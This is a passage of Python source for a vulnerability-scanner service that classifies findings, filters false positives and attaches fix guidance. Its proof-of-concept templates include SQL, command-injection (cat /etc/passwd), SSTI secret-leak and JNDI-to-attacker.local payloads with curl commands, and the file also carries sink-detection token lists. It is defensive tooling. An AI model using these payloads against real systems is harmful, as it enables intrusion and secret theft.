import json
import os
import re
import shutil
import subprocess
import sys
from pathlib import Path
from typing import Dict, List

from dotenv import load_dotenv

from backend.models.scan_model import AIGuidance, SecurityIssue
from backend.services.ast_scanner import hybrid_analyze_file
from backend.services.dependency_scanner import DependencyScanner
from backend.services.rule_engine import RuleEngine
from backend.services.secret_scanner import scan_secrets
from backend.services.taint_service import TaintFlow, TaintService
from backend.utils.security import (
    SEVERITY_CRITICAL,
    SEVERITY_HIGH,
    SEVERITY_INFO,
    SEVERITY_LOW,
    SEVERITY_MEDIUM,
    compute_risk_score,
    is_excluded_path,
    normalize_bandit_severity,
    normalize_semgrep_severity,
)

load_dotenv()


class ScannerServiceError(Exception):
    pass


class ScannerDependencyError(ScannerServiceError):
    pass


class ScannerService:
    NODE_SOURCE_EXTENSIONS = {".js", ".jsx", ".ts", ".tsx", ".mjs", ".cjs"}
    NODE_DEPENDENCY_MANIFESTS = {"package.json", "package-lock.json", "yarn.lock", "pnpm-lock.yaml"}
    NODE_REPO_MARKERS = {"package.json", "package-lock.json", "yarn.lock", "pnpm-lock.yaml"}
    UNVERIFIED_CATEGORY = "Unverified Security Signal"

    IMPROVEMENT_CATEGORY_SEVERITY: dict[str, str] = {
        "Debug Mode Enabled (Improvement)": SEVERITY_LOW,
        "Hardcoded URL Configuration": SEVERITY_INFO,
        "Environment Secret Fallback": SEVERITY_LOW,
        "Debug Logging Hygiene": SEVERITY_INFO,
        "Broad Exception Handling": SEVERITY_LOW,
        "Input Validation Coverage Hint": SEVERITY_INFO,
        "Weak Randomness Hygiene": SEVERITY_INFO,
        "HTTPS Migration Opportunity": SEVERITY_LOW,
        "Large Function Complexity": SEVERITY_INFO,
        "Credential Placeholder Cleanup": SEVERITY_LOW,
        "Unused Import Hygiene": SEVERITY_INFO,
        "Error Boundary Coverage": SEVERITY_INFO,
        "File Context Manager Hygiene": SEVERITY_LOW,
        "Rate Limiting Coverage Hint": SEVERITY_INFO,
        "Critical Action Audit Logging": SEVERITY_INFO,
    }

    POC_TEMPLATES: dict[str, dict[str, str]] = {
        "prototype pollution": {
            "payload": '{"__proto__": {"admin": true}}',
            "command": "curl -X POST https://api.app.com -H \"Content-Type: application/json\" -d '{\"__proto__\":{\"admin\":true}}'",
            "snippet": "const _ = require(\"lodash\");\n_.merge({}, JSON.parse('{\"__proto__\":{\"admin\":true}}'));\nconsole.log({}.admin); // true",
        },
        "sql injection": {
            "payload": "' OR 1=1 --",
            "command": "curl -X GET 'https://api.app.com/users?id=%27%20OR%201%3D1%20--'",
            "snippet": "const userId = req.query.id;\ndb.query(\"SELECT * FROM users WHERE id=\" + userId); // vulnerable",
        },
        "command injection": {
            "payload": "test; cat /etc/passwd",
            "command": "curl -X POST https://api.app.com/run -H \"Content-Type: application/json\" -d '{\"cmd\":\"test; cat /etc/passwd\"}'",
            "snippet": "const cmd = req.body.cmd;\nexec(\"echo \" + cmd); // vulnerable",
        },
        "auth bypass": {
            "payload": '{"role":"admin"}',
            "command": "curl -X POST https://api.app.com/login -H \"Content-Type: application/json\" -d '{\"role\":\"admin\"}'",
            "snippet": "if (token && token.role === \"admin\") {\n  grantAdmin();\n} // bypass if token validation is weak",
        },
        "dos": {
            "payload": "A" * 1000000,
            "command": "curl -X POST https://api.app.com/parse --data-binary @large-payload.txt",
            "snippet": "const parsed = parser.parse(untrustedInput); // may crash on crafted payload",
        },
        "injection": {
            "payload": "${jndi:ldap://attacker.local/a}",
            "command": "curl -X POST https://api.app.com/ingest -H \"Content-Type: text/plain\" -d '${jndi:ldap://attacker.local/a}'",
            "snippet": "sink(untrustedInput); // injection sink reached",
        },
        "server-side template injection": {
            "payload": "{{7*7}}",
            "command": "curl 'https://app.com/endpoint?name={{config.SECRET_KEY}}'",
            "snippet": "# Test: ?name={{7*7}} returns 49 = exploitable\n# Leak secret: ?name={{config.SECRET_KEY}}",
        },
        "ssti": {
            "payload": "{{config}}",
            "command": "curl 'https://app.com/endpoint?name={{config}}'",
            "snippet": "# Jinja2 SSTI - attacker can read config, env vars, and achieve RCE",
        },
    }

    def __init__(self) -> None:
        self.semgrep_timeout_seconds = self._read_int_env("SEMGREP_TIMEOUT_SECONDS", 480)
        self.bandit_timeout_seconds = self._read_int_env("BANDIT_TIMEOUT_SECONDS", 180)
        self.max_findings = self._read_int_env("MAX_FINDINGS", 200)
        self.semgrep_executable = self._resolve_tool_executable("semgrep")
        self.last_files_scanned = 0
        self.last_patterns_checked = 0
        self.last_analyzer_capabilities: Dict[str, bool] = {
            "dependency_scanner": False,
            "rule_engine": False,
            "taint_service": False,
            "semgrep": False,
            "bandit": False,
        }
        self.last_detected_frameworks: List[str] = []
        self.rule_engine = RuleEngine()
        self.rule_engine.load_external_rules()
        self.dependency_scanner = DependencyScanner()
        self.taint_service = TaintService()

    @staticmethod
    def _normalize_framework_name(name: str) -> str:
        value = str(name or "").strip().lower()
        aliases = {
            "node": "express",
            "javascript": "express",
            "py": "python",
        }
        return aliases.get(value, value)

    @classmethod
    def _frameworks_from_dependency_text(cls, text: str) -> set[str]:
        import re as _re
        blob = str(text or "")
        hits: set[str] = set()
        markers = {
            "express": r'(^|["\'\s])express(["\'@\s=<>~^]|$)',
            "nestjs": r'@nestjs/',
            "fastify": r'(^|["\'\s])fastify(["\'@\s=<>~^]|$)',
            "koa": r'(^|["\'\s])koa(["\'@\s=<>~^]|$)',
            "hapi": r'@hapi/',
            "nextjs": r'(^|["\'\s])next(["\'@\s=<>~^]|$)',
            "django": r'(?im)^\s*django\b',
            "flask": r'(?im)^\s*flask\b',
            "fastapi": r'(?im)^\s*fastapi\b',
            "starlette": r'(?im)^\s*starlette\b',
            "sanic": r'(?im)^\s*sanic\b',
            "tornado": r'(?im)^\s*tornado\b',
            "falcon": r'(?im)^\s*falcon\b',
            "pyramid": r'(?im)^\s*pyramid\b',
        }
        for framework, pattern in markers.items():
            if _re.search(pattern, blob):
                hits.add(framework)
        return hits

    @classmethod
    def _frameworks_from_source_text(cls, text: str) -> set[str]:
        blob = str(text or "").lower()
        hits: set[str] = set()
        source_markers = {
            "from flask import": "flask",
            "import flask": "flask",
            "from django": "django",
            "import django": "django",
            "from fastapi import": "fastapi",
            "import fastapi": "fastapi",
            "from starlette": "starlette",
            "from sanic": "sanic",
            "import tornado": "tornado",
            "import falcon": "falcon",
            "from pyramid": "pyramid",
            "from nestjs": "nestjs",
            "@nestjs/": "nestjs",
            "from 'express'": "express",
            'from "express"': "express",
            "require('express')": "express",
            'require("express")': "express",
            "from 'koa'": "koa",
            'from "koa"': "koa",
            "from 'fastify'": "fastify",
            'from "fastify"': "fastify",
        }
        import re as _re
        for token, framework in source_markers.items():
            if _re.search(r"(?m)^\s*" + _re.escape(token), blob):
                hits.add(framework)
        return hits

    @classmethod
    def _detect_frameworks_from_repo(cls, repo_dir: Path, taint_flows: List[TaintFlow]) -> List[str]:
        detected: set[str] = {
            cls._normalize_framework_name(str(flow.framework or ""))
            for flow in taint_flows
            if str(flow.framework or "").strip()
        }

        dependency_files = (
            "package.json",
            "requirements.txt",
            "pyproject.toml",
            "Pipfile",
            "poetry.lock",
        )
        for file_name in dependency_files:
            for path in repo_dir.rglob(file_name):
                if not path.is_file():
                    continue
                if is_excluded_path(path, repo_dir):
                    continue
                try:
                    text = path.read_text(encoding="utf-8", errors="replace")
                except Exception:
                    continue
                detected.update(cls._frameworks_from_dependency_text(text))

        source_exts = {".py", ".js", ".jsx", ".ts", ".tsx", ".mjs", ".cjs"}
        scanned_files = 0
        for path in repo_dir.rglob("*"):
            if scanned_files >= 200:
                break
            if not path.is_file() or path.suffix.lower() not in source_exts:
                continue
            if is_excluded_path(path, repo_dir):
                continue
            scanned_files += 1
            try:
                text = path.read_text(encoding="utf-8", errors="replace")
            except Exception:
                continue
            detected.update(cls._frameworks_from_source_text(text))

        detected.discard("")
        detected.discard("unknown")
        return sorted(detected)

    @staticmethod
    def _read_int_env(name: str, default: int) -> int:
        raw = os.getenv(name, str(default)).strip()
        try:
            value = int(raw)
            return value if value > 0 else default
        except ValueError:
            return default

    @staticmethod
    def _resolve_tool_executable(tool_name: str) -> str:
        explicit = os.getenv(f"{tool_name.upper()}_EXECUTABLE", "").strip()
        if explicit:
            return explicit

        python_dir = Path(sys.executable).resolve().parent
        scripts_dir = python_dir if python_dir.name.lower() == "scripts" else (
            python_dir / ("Scripts" if os.name == "nt" else "bin")
        )
        candidate = scripts_dir / (f"{tool_name}.exe" if os.name == "nt" else tool_name)
        if candidate.exists():
            return str(candidate)

        if os.name != "nt":
            common_unix_path = Path("/usr/local/bin") / tool_name
            if common_unix_path.exists():
                return str(common_unix_path)

        resolved = shutil.which(tool_name)
        if resolved:
            return resolved

        return tool_name

    @staticmethod
    def _run_command(command: list[str], timeout_seconds: int, ok_returncodes: tuple[int, ...] = (0,)) -> dict:
        try:
            result = subprocess.run(
                command,
                check=False,
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
                timeout=timeout_seconds,
            )
        except FileNotFoundError as exc:
            raise ScannerDependencyError(f"Command not found: {command[0]}") from exc
        except subprocess.TimeoutExpired as exc:
            raise ScannerServiceError(f"Command timed out: {' '.join(command)}") from exc

        if result.returncode not in ok_returncodes:
            stderr = (result.stderr or "").strip()
            stdout = (result.stdout or "").strip()
            message = stderr or stdout or "Unknown scanner failure"
            raise ScannerServiceError(message)

        try:
            return json.loads(result.stdout or "{}")
        except json.JSONDecodeError as exc:
            raise ScannerServiceError("Scanner returned invalid JSON output") from exc

    @staticmethod
    def _has_python_files(repo_dir: Path) -> bool:
        return any(repo_dir.rglob("*.py"))

    @classmethod
    def _is_node_source_path(cls, file_path: str) -> bool:
        suffix = Path(str(file_path or "").strip()).suffix.lower()
        return suffix in cls.NODE_SOURCE_EXTENSIONS

    @classmethod
    def _is_node_manifest_path(cls, file_path: str) -> bool:
        name = Path(str(file_path or "").strip()).name.lower()
        return name in cls.NODE_DEPENDENCY_MANIFESTS

    @classmethod
    def _is_node_repository(cls, repo_dir: Path) -> bool:
        for marker in cls.NODE_REPO_MARKERS:
            if any(repo_dir.rglob(marker)):
                return True
        return any(repo_dir.rglob("*.js")) or any(repo_dir.rglob("*.jsx")) or any(repo_dir.rglob("*.ts")) or any(repo_dir.rglob("*.tsx"))

    @staticmethod
    def _default_guidance() -> AIGuidance:
        return AIGuidance(
            explanation="AI explanation not generated yet.",
            danger="Run with an LLM API key to get contextual danger analysis.",
            real_world_example="Example unavailable until AI enrichment runs.",
            exact_fix="Manual review required: scanner confidence is limited for this finding.",
        )

    @classmethod
    def _poc_template_for_text(cls, text: str) -> dict[str, str] | None:
        blob = str(text or "").lower()
        for key, template in cls.POC_TEMPLATES.items():
            if key in blob:
                return template
        return None

    @classmethod
    def _dependency_poc(cls, issue_text: str, package: str) -> tuple[str | None, str | None, str | None]:
        template = cls._poc_template_for_text(issue_text)
        if template is None:
            return None, None, None

        snippet = template["snippet"]
        if "lodash" in snippet and package:
            snippet = snippet.replace("lodash", package)
        return template.get("payload"), template.get("command"), snippet

    _FIX_GUIDANCE: dict[str, str] = {
        "SQL Injection": (
            "Use parameterized queries or an ORM. Never concatenate user input into SQL. "
            "Pass values as bound parameters: db.query('... WHERE id = ?', [value])."
        ),
        "Command Injection": (
            "Never pass user input to a shell. Use an argument list with shell disabled "
            "(execFile in Node, subprocess.run([...], shell=False) in Python) and validate against an allowlist."
        ),
        "Dynamic Code Execution (eval/exec)": (
            "Remove eval/exec on untrusted input. Use JSON.parse for data in Node, "
            "ast.literal_eval in Python, or an explicit dispatch table for known actions."
        ),
        "Hardcoded Secrets": (
            "Move the value to an environment variable or a secrets manager, and rotate/revoke "
            "the exposed credential immediately - treat anything committed as compromised."
        ),
        "Open Redirect": (
            "Do not redirect to raw user input. Resolve the destination through an allowlist of "
            "known internal paths and fall back to a safe default."
        ),
        "Path Traversal": (
            "Strip directory components with basename() before joining, and confirm the resolved "
            "path stays within the intended base directory."
        ),
        "NoSQL Injection": (
            "Never pass a raw request object into a query. Extract and type-check individual fields, "
            "and reject query operators ($-prefixed keys) from user input."
        ),
        "Insecure Auth Logic": (
            "Avoid hardcoded credential comparisons. Use a vetted auth library with constant-time "
            "comparison and hashed credential verification (e.g. bcrypt.compare)."
        ),
        "Weak Random Generator Usage": (
            "Replace Math.random/random with a cryptographically secure source "
            "(crypto.randomBytes in Node, secrets module in Python) for any security-relevant value."
        ),
        "Weak Randomness Hygiene": (
            "Replace Math.random/random with a cryptographically secure source "
            "(crypto.randomBytes in Node, secrets module in Python) for any security-relevant value."
        ),
    }

    @classmethod
    def _fix_guidance_for_category(cls, category: str) -> str:
        return cls._FIX_GUIDANCE.get(
            str(category or "").strip(),
            "Review this finding and apply a context-appropriate secure fix before merging.",
        )

    @classmethod
    def _code_poc(cls, category: str, route_hint: str | None = None) -> tuple[str | None, str | None, str | None]:
        template = cls._poc_template_for_text(category)
        if template is None:
            return None, None, None

        command = template.get("command")
        if route_hint:
            method_path = str(route_hint).strip()
            parts = method_path.split(" ", 1)
            if len(parts) == 2:
                method, path = parts
                command = f"curl -X {method.upper()} https://api.app.com{path}"
        return template.get("payload"), command, template.get("snippet")

    @staticmethod
    def _is_non_production_code_path(file_path: str) -> bool:
        normalized = str(file_path or "").replace("\\", "/").strip().lower()
        if not normalized:
            return False

        segments = [segment for segment in normalized.split("/") if segment]
        non_prod_markers = {
            "test",
            "tests",
            "spec",
            "specs",
            "fixture",
            "fixtures",
            "example",
            "examples",
            "demo",
            "demos",
            "sample",
            "samples",
            "script",
            "scripts",
            "benchmark",
            "benchmarks",
        }
        return any(segment in non_prod_markers for segment in segments)

    @staticmethod
    def _looks_like_command_concat_or_shell(evidence_blob: str) -> bool:
        blob = str(evidence_blob or "").lower()
        if any(token in blob for token in ["shell=true", "os.system", "exec.command", "process.start"]):
            return True

        # child_process-style command execution APIs.
        if any(token in blob for token in ["exec(\"", "exec('", "execsync(", "spawn(", "spawnsync("]):
            return True

        # Concatenation/template-style command assembly hints.
        if any(token in blob for token in [" + ", "+", "f\"", "f'", ".format(", "%s", "${"]):
            if any(token in blob for token in ["subprocess", "exec(", "spawn(", "command", "os.system"]):
                return True
        return False

    @staticmethod
    def _normalize_issue_text(*parts: str) -> str:
        return " ".join((part or "").lower() for part in parts if part)

    @staticmethod
    def _is_valid_match(rule_id: str, snippet: str) -> bool:
        rid = str(rule_id or "").strip().lower()
        snippet_lower = str(snippet or "").lower().strip()

        if rid == "regex.command-injection":
            # Skip pure import lines such as "import subprocess".
            if snippet_lower.startswith("import ") or snippet_lower.startswith("from "):
                return False
            return any(
                token in snippet_lower
                for token in ["request", "input", "args", "shell=true", "+", "os.system", "exec("]
            )

        return True

    @staticmethod
    def _normalize_file_path(file_path: str, repo_dir: Path) -> str:
        raw = (file_path or "unknown").strip()
        if not raw:
            return "unknown"

        candidate = Path(raw)
        repo_resolved = repo_dir.resolve()
        if candidate.is_absolute():
            try:
                return candidate.resolve().relative_to(repo_resolved).as_posix()
            except Exception:
                pass

        normalized = raw.replace("\\", "/")
        lowered = normalized.lower()
        marker = "/repo/"
        if marker in lowered:
            idx = lowered.rfind(marker)
            tail = normalized[idx + len(marker) :]
            if tail:
                return tail.lstrip("/")

        return normalized.lstrip("./") or "unknown"

    @staticmethod
    def _classify_category(rule_id: str, title: str, message: str, code_snippet: str) -> str:
        key = ScannerService._normalize_issue_text(rule_id, title, message, code_snippet)
        normalized_rule = (rule_id or "").strip().lower()

        improvement_categories = {
            "regex.improvement.debug-enabled": "Debug Mode Enabled (Improvement)",
            "regex.improvement.hardcoded-url": "Hardcoded URL Configuration",
            "regex.improvement.env-default-secret": "Environment Secret Fallback",
            "regex.improvement.debug-logging": "Debug Logging Hygiene",
            "regex.improvement.broad-except": "Broad Exception Handling",
            "regex.improvement.input-validation-hint": "Input Validation Coverage Hint",
            "regex.improvement.weak-random": "Weak Randomness Hygiene",
            "regex.improvement.insecure-http": "HTTPS Migration Opportunity",
            "regex.improvement.large-function": "Large Function Complexity",
            "regex.improvement.credential-placeholder": "Credential Placeholder Cleanup",
            "regex.improvement.unused-import-hint": "Unused Import Hygiene",
            "regex.improvement.missing-error-boundary": "Error Boundary Coverage",
            "regex.improvement.open-no-context-manager": "File Context Manager Hygiene",
            "regex.improvement.no-rate-limit-hint": "Rate Limiting Coverage Hint",
            "regex.improvement.critical-action-logging": "Critical Action Audit Logging",
        }
        if normalized_rule in improvement_categories:
            return improvement_categories[normalized_rule]

        exact_rule_categories = {
            "regex.sql-injection": "SQL Injection",
            "regex.command-injection": "Command Injection",
            "regex.hardcoded-secret": "Hardcoded Secrets",
            "regex.open-redirect": "Open Redirect",
            "regex.insecure-auth": "Insecure Auth Logic",
            "regex.eval-usage": "Dynamic Code Execution (eval/exec)",
            "regex.insecure-cors": "Insecure CORS Configuration",
            "regex.credential-url": "Credential in URL",
            "regex.ssti": "Server-Side Template Injection",
            "bandit.b301": "Unsafe Pickle Deserialization",
            "flask-debug": "Flask Debug Mode Enabled",
            "yaml.load": "Unsafe YAML Deserialization",
            "jinja.template.safe-filter": "Unescaped HTML in Template (Potential XSS)",
            "semgrep.weak-input": "Weak Input Validation",
        }
        if normalized_rule in exact_rule_categories:
            return exact_rule_categories[normalized_rule]

        # Keep Semgrep/Bandit category mapping deterministic by rule ID and sink APIs.
        if "yaml" in normalized_rule and "load" in normalized_rule:
            return "Unsafe YAML Deserialization"
        if "pickle" in normalized_rule or normalized_rule.startswith("bandit.b301"):
            return "Unsafe Pickle Deserialization"
        if any(token in normalized_rule for token in ["sql", "sqli", "fromsqlraw", "executesqlraw", "sqlcommand", "db.query", "queryrow"]):
            return "SQL Injection"
        if any(token in normalized_rule for token in ["command", "exec-command", "process-start", "os.system", "subprocess", "popen"]):
            return "Command Injection"
        if any(token in normalized_rule for token in ["credential-url", "secret", "hardcoded", "api-key", "apikey"]):
            return "Hardcoded Secrets"
        if "open-redirect" in normalized_rule:
            return "Open Redirect"
        if "render_template_string" in key or "ssti" in normalized_rule:
            return "Server-Side Template Injection"
        if "eval" in normalized_rule:
            return "Dynamic Code Execution (eval/exec)"
        # exec from child_process/shell APIs is command injection, not eval/code execution.
        if "exec" in normalized_rule:
            blob_lower = key
            if any(token in blob_lower for token in ["child_process", "execsync", "spawnsync", "os.system", "subprocess"]):
                return "Command Injection"
            return "Dynamic Code Execution (eval/exec)"
        if "cors" in normalized_rule:
            return "Insecure CORS Configuration"
        if "logging" in normalized_rule:
            return "Debug Logging Hygiene"

        if any(token in key for token in ["|safe", "innerhtml", "dangerouslysetinnerhtml", "mark_safe(", "autoescape=false"]):
            return "Unescaped HTML in Template (Potential XSS)"
        if any(token in key for token in ["flask debug", "debug=true", "app.run(debug=true)", "werkzeug debugger", "use_debugger"]):
            return "Flask Debug Mode Enabled"
        if "yaml.load" in key or "loader=yaml.loader" in key or "unsafe yaml" in key:
            return "Unsafe YAML Deserialization"
        if "pickle.load" in key or "pickle.loads" in key or "unsafe pickle" in key:
            return "Unsafe Pickle Deserialization"
        if "credential-url" in key or "credentials embedded" in key or re.search(r"https?://[^\s\"']*:[^\s\"']*@", key):
            return "Credential in URL"
        if any(token in key for token in ["command injection", "shell=true", "os.system", "subprocess", "exec.command", "process.start", "runtime.getruntime().exec"]):
            return "Command Injection"
        if any(token in key for token in ["sql injection", "sqli", "cursor.execute(", "fromsqlraw(", "executesqlraw(", "sqlcommand", "db.query(", "db.exec(", "queryrow("]):
            return "SQL Injection"
        if any(token in key for token in ["hardcoded", "hard-coded", "secret", "api key", "apikey", "password"]) and any(
            marker in key for marker in [" = ", "='", '= "', "token", "secret", "apikey", "api_key"]
        ):
            return "Hardcoded Secrets"
        if any(token in key for token in ["open redirect", "regex.open-redirect", "res.redirect", "redirect("]):
            return "Open Redirect"
        if any(token in key for token in ["insecure auth", "regex.insecure-auth", "auth = false", "password =="]):
            return "Insecure Auth Logic"
        if any(token in key for token in ["eval(", "regex.eval-usage"]):
            return "Dynamic Code Execution (eval/exec)"
        if "exec(" in key:
            if any(token in key for token in ["child_process", "require", "execsync", "spawnsync", "os.system", "subprocess"]):
                return "Command Injection"
            return "Dynamic Code Execution (eval/exec)"
        if any(token in key for token in ["insecure-cors", "cors(app)", "access-control-allow-origin", "allow-origin"]):
            return "Insecure CORS Configuration"
        if any(token in key for token in ["weak-random", "random.randint", "random.random", "random.choice"]):
            return "Weak Random Generator Usage"
        if any(token in key for token in ["exception-leak", "stack trace", "traceback", "str(exc)", "str(exception)"]):
            return "Exception Detail Exposure"
        if any(token in key for token in ["missing-https", "hardcoded-http-url", "http://"]):
            return "Insecure HTTP Usage"
        if any(token in key for token in ["console.log", "logging.debug", "print(", "debug log", "debug print"]):
            return "Debug Logging Hygiene"
        if any(token in key for token in ["unsanitized", "unvalidated", "input validation", "weak validation", "sanitize"]):
            return "Weak Input Validation"
        return ScannerService.UNVERIFIED_CATEGORY

    @staticmethod
    def _should_emit_issue(issue: SecurityIssue, strict_mode: bool = False) -> bool:
        evidence_blob = ScannerService._normalize_issue_text(
            issue.rule_id,
            issue.message,
            issue.evidence,
            issue.file,
        )

        if issue.category == ScannerService.UNVERIFIED_CATEGORY:
            return False

        if strict_mode:
            # Strict mode raises recall by relaxing confidence-oriented suppression.
            if issue.category in {"Insecure HTTP Usage", "HTTPS Migration Opportunity"}:
                if any(token in evidence_blob for token in ["http://localhost", "http://127.0.0.1", "localhost:", "127.0.0.1:"]):
                    return False
            return True

        if issue.category == "Hardcoded Secrets":
            if any(token in evidence_blob for token in ["http://", "https://", "localhost", "127.0.0.1"]):
                return False

            file_lower = str(issue.file or "").lower().replace("\\", "/")
            test_markers = ["/test", "tests/", "test/", "/spec", "spec/", "_test.", ".test.", ".spec."]
            if any(marker in file_lower for marker in test_markers):
                return False

            secret_value = re.search(r"[\"']([^\"']+)[\"']", issue.evidence or "")
            secret_val = secret_value.group(1).strip().lower() if secret_value else ""
            placeholders = {
                "test",
                "example",
                "changeme",
                "dummy",
                "sample",
                "placeholder",
                "your_key_here",
                "insert_here",
                "replace_me",
                "xxx",
                "abc123",
            }
            if secret_val in placeholders:
                return False
            if any(secret_val.startswith(prefix) for prefix in {"changeme", "dummy", "sample", "placeholder"}):
                return False

            if secret_value and len(secret_value.group(1)) < 12:
                return False

        if issue.category in {"SQL Injection", "Command Injection"}:
            # Skip import-only lines to avoid false positives like "import subprocess".
            evidence_lower = str(issue.evidence or "").strip().lower()
            if evidence_lower.startswith("import ") or evidence_lower.startswith("from "):
                return False

            # AST scanner already confirmed this is a real call expression (not a string
            # literal or comment), so source-hint verification is not required.
            if issue.scanner != "ast_scanner" and issue.data_source != "user_input":
                source_hints = [
                    "request.",
                    "request[",
                    "req.",
                    "params",
                    "argv",
                    "user input",
                    "untrusted",
                    "input(",
                    "httpcontext.request",
                    "request.query",
                    "request.form",
                    "r.url.query",
                    "queryparam(",
                ]
                if not any(token in evidence_blob for token in source_hints):
                    return False

        if issue.category == "Dynamic Code Execution (eval/exec)":
            if issue.data_source != "user_input":
                source_hints = [
                    "request.",
                    "request[",
                    "req.",
                    "params",
                    "argv",
                    "user input",
                    "untrusted",
                    "input(",
                    "httpcontext.request",
                    "request.query",
                    "request.form",
                    "r.url.query",
                    "queryparam(",
                ]
                if not any(token in evidence_blob for token in source_hints):
                    return False

        if issue.category == "Open Redirect":
            evidence_lower = str(issue.evidence or "").lower()
            has_redirect_sink = any(token in evidence_lower for token in ["redirect(", "res.redirect", "return redirect"])
            redirect_arg = None
            arg_match = re.search(r"(?:res\.)?redirect\s*\(([^)]*)\)", evidence_lower)
            if arg_match:
                redirect_arg = arg_match.group(1).strip()
            has_literal_destination = bool(
                redirect_arg
                and len(redirect_arg) >= 2
                and ((redirect_arg[0] == "'" and redirect_arg[-1] == "'") or (redirect_arg[0] == '"' and redirect_arg[-1] == '"'))
            )
            if has_redirect_sink and not has_literal_destination:
                return True
            if issue.data_source != "user_input":
                return False

        if issue.category == "Weak Input Validation":
            if any(token in evidence_blob for token in ["console.log", "logging.debug", "print("]):
                return False

            if issue.data_source != "user_input":
                return False

            risky_usage = {"executed", "database", "parsed"}
            if issue.usage_context not in risky_usage:
                return False

            sink_hints = [
                "cursor.execute",
                "select ",
                "eval(",
                "exec(",
                "os.system",
                "subprocess",
                "yaml.load",
                "pickle.load",
                "pickle.loads",
                "fromsqlraw",
                "executesqlraw",
                "sqlcommand",
                "queryrow(",
                "db.query(",
                "db.exec(",
                "exec.command",
                "process.start",
            ]
            if not any(token in evidence_blob for token in sink_hints):
                return False

        if issue.category in {"Insecure HTTP Usage", "HTTPS Migration Opportunity"}:
            if any(token in evidence_blob for token in ["http://localhost", "http://127.0.0.1", "localhost:", "127.0.0.1:"]):
                return False

        return True

    @staticmethod
    def _flow_kind_for_category(category: str) -> str | None:
        cat = (category or "").lower()
        if "sql injection" in cat:
            return "sql_injection"
        if "command injection" in cat:
            return "command_injection"
        if "open redirect" in cat:
            return "open_redirect"
        return None

    @staticmethod
    def _flow_tier_rank(tier: str) -> int:
        normalized = (tier or "").upper()
        if normalized == "HIGH":
            return 3
        if normalized == "MEDIUM":
            return 2
        if normalized == "LOW":
            return 1
        return 0

    @staticmethod
    def _confidence_cap_for_tier(tier: str) -> int:
        normalized = (tier or "").upper()
        if normalized == "HIGH":
            return 92
        if normalized == "MEDIUM":
            return 84
        return 72

    def _confidence_boost_from_flow(self, base_confidence: int, flow: TaintFlow) -> int:
        tier = (flow.exploitability_level or "LOW").upper()
        base_boost = {
            "HIGH": 16,
            "MEDIUM": 9,
            "LOW": 3,
        }.get(tier, 3)

        if flow.sanitized:
            # Sanitized paths should not gain confidence from taint.
            base_boost = 0

        depth_penalty = min(flow.propagation_depth, 2) * 3
        uncertainty_penalty = 2 if flow.uncertain else 0
        if flow.uncertain and flow.propagation_depth >= 2:
            # Compound uncertainty for deep propagated flows.
            uncertainty_penalty += 2
        sanitized_penalty = 5 if flow.sanitized else 0
        adjusted_boost = max(0, base_boost - depth_penalty - uncertainty_penalty - sanitized_penalty)

        capped = self._confidence_cap_for_tier(tier)
        return max(0, min(capped, int(base_confidence) + adjusted_boost))

    def _apply_taint_context(self, issues: List[SecurityIssue], flows: List[TaintFlow]) -> List[SecurityIssue]:
        flow_map: dict[tuple[str, str], List[TaintFlow]] = {}
        for flow in flows:
            key = (flow.file_path, flow.kind)
            flow_map.setdefault(key, []).append(flow)

        enriched: List[SecurityIssue] = []
        for issue in issues:
            expected_kind = self._flow_kind_for_category(issue.category)
            if not expected_kind:
                enriched.append(issue)
                continue

            key = (str(issue.file or ""), expected_kind)
            candidates = flow_map.get(key, [])
            if not candidates:
                issue_line = int(issue.line or 0)
                candidates = [
                    flow
                    for flow in flows
                    if flow.kind == expected_kind
                    and flow.file_path == str(issue.file or "")
                    and issue_line > 0
                    and abs(int(flow.line or 0) - issue_line) <= 3
                ]
            if not candidates:
                if issue.scanner == "regex":
                    if issue.category == "Dynamic Code Execution (eval/exec)":
                        enriched.append(issue)
                        continue
                    has_untrusted_source = issue.data_source == "user_input"
                    has_risky_sink = issue.usage_context in {"database", "executed"}
                    sink_blob = self._normalize_issue_text(issue.evidence, issue.message, issue.rule_id)
                    sink_hints = [
                        "cursor.execute",
                        "select ",
                        "eval(",
                        "exec(",
                        "os.system",
                        "subprocess",
                        "yaml.load",
                        "pickle.load",
                        "pickle.loads",
                        "fromsqlraw",
                        "executesqlraw",
                        "sqlcommand",
                        "queryrow(",
                        "db.query(",
                        "db.exec(",
                        "exec.command",
                        "process.start",
                        "shell=true",
                    ]
                    has_explicit_sink_hint = any(token in sink_blob for token in sink_hints)
                    if not (has_untrusted_source and has_risky_sink and has_explicit_sink_hint):
                        continue
                reduced_conf = min(issue.confidence, 55)
                downgraded_severity = self._cap_severity(issue.severity, SEVERITY_LOW)
                enriched.append(
                    issue.model_copy(
                        update={
                            "severity": downgraded_severity,
                            "title": f"[{downgraded_severity}] {issue.category}",
                            "confidence": reduced_conf,
                            "confidence_label": "LOW",
                            "attention_level": self._attention_level(reduced_conf, issue.exploitability_level),
                            "exploitability": "unknown",
                            "exploitability_level": "LOW",
                        }
                    )
                )
                continue

            unsafe_candidates = [flow for flow in candidates if not flow.sanitized]
            if not unsafe_candidates:
                reduced_conf = min(issue.confidence, 52)
                downgraded_severity = self._cap_severity(issue.severity, SEVERITY_LOW)
                usage_context = issue.usage_context
                if expected_kind == "sql_injection":
                    usage_context = "database"
                elif expected_kind == "command_injection":
                    usage_context = "executed"
                enriched.append(
                    issue.model_copy(
                        update={
                            "severity": downgraded_severity,
                            "title": f"[{downgraded_severity}] {issue.category}",
                            "data_source": "user_input",
                            "usage_context": usage_context,
                            "confidence": reduced_conf,
                            "confidence_label": "LOW",
                            "attention_level": "LOW",
                            "exploitability": "unknown",
                            "exploitability_level": "LOW",
                        }
                    )
                )
                continue

            unsafe_candidates.sort(
                key=lambda flow: (
                    -self._flow_tier_rank(flow.exploitability_level),
                    flow.propagation_depth,
                    1 if flow.uncertain else 0,
                    flow.line,
                )
            )
            flow = unsafe_candidates[0]
            usage_context = issue.usage_context
            if expected_kind == "sql_injection":
                usage_context = "database"
            elif expected_kind == "command_injection":
                usage_context = "executed"

            boosted_conf = self._confidence_boost_from_flow(int(issue.confidence), flow)
            tier_cap = {
                "HIGH": SEVERITY_HIGH,
                "MEDIUM": SEVERITY_MEDIUM,
                "LOW": SEVERITY_LOW,
            }.get((flow.exploitability_level or "LOW").upper(), SEVERITY_LOW)
            adjusted_severity = self._cap_severity(issue.severity, tier_cap)
            enriched.append(
                issue.model_copy(
                    update={
                        "severity": adjusted_severity,
                        "title": f"[{adjusted_severity}] {issue.category}",
                        "data_source": "user_input",
                        "usage_context": usage_context,
                        "confidence": boosted_conf,
